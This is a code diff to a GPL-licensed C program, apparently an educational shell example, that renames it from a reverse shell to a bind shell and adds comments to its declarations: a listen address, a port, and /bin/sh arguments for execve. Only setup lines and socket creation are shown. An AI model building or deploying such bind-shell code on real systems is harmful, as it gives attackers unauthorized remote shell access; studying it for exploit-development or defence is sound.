@@ -1,5 +1,5 @@
 /**
- TITLE: C Reverse Shell Example
+ TITLE: C Bind Shell Example
  Author: Guillem Alminyana
  License: GPLv3 or Later
  Description: Accepts incoming connection and spawns shell
@@ -19,12 +19,11 @@
 
 int main (int argc, char * argv[]) {
 
-    int port = atoi(argv[2]);
-    char * ip_address = argv[1];
-    char * const execve_params[] = {"/bin/sh", NULL};
-    char shell_to_exec[] = "/bin/sh";
-	int fd_accepted_connection;
-
+    int port = atoi(argv[2]);                                    //<- Port toaccept connections
+    char * ip_address = argv[1];                                 //<- IP Address to listen on
+    char * const execve_params[] = {"/bin/sh", NULL};            //<- Parameters for execve syscall. Usually like this
+    char shell_to_exec[] = "/bin/sh";                            //<- Shell path to run
+    int fd_accepted_connection;                                  //<- socket for the accepted incoming connection
     struct sockaddr_in my_sockaddr;
 
     int my_socket = socket(AF_INET, SOCK_STREAM, 0);              //<- Create the Socket
